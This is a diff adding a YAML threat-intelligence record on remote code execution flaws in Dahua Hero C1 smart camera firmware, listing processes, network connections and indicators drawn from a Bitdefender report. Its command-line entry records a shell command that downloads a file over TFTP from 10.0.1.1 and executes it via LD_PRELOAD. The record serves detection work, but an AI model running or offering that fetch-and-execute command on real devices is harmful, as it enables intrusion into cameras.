@@ -1,0 +1,34 @@
+description: Critical security vulnerabilities in Dahua Hero C1 (DH-H4C) smart camera
+  firmware allow unauthenticated remote code execution via ONVIF protocol and file
+  upload handlers.
+TTPs:
+  processes:
+  - /bin/sh
+  commandline:
+  - /bin/sh -c cd /var/tmp/; busybox tftp -gr a 10.0.1.1; LD_PRELOAD=/var/tmp/a /bin/ls
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: /bin/sh
+    destination: 10.0.1.1
+    port: 69
+  file_activity:
+  - /var/tmp/a
+  persistence: []
+  pipes: []
+  process_relations:
+  - parent: root
+    child: /bin/sh
+IOCs:
+  hashes: []
+  IPs:
+  - 10.0.1.1
+  domains: []
+  URLs: []
+authors:
+- Bitdefender Researchers
+reference: https://www.bitdefender.com/en-us/blog/labs/vulnerabilities-identified-in-dahua-hero-c1-smart-cameras
+date_of_publication: January 23, 2024
+file_creation_date: August 03, 2025
